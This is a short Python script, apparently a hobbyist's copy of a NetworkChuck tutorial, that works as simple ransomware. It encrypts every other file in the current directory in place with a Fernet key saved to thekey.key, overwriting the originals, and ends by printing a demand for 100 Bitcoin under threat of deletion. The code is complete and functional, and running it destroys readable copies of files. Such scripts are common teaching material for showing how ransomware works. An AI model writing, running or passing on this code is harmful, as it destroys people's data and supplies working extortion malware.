ShoutOut to NetworkChuck!!

#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

# Let's find some files

files = []

for file in os.listdir():
	if file == "pain.py" or file == "thekey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)

key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
	thekey.write(key)

for file in files:
	with open(file,"rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)

print("All your files have been encrypted!! Send me 100 Bitcoin or I'll delete them in 24h")
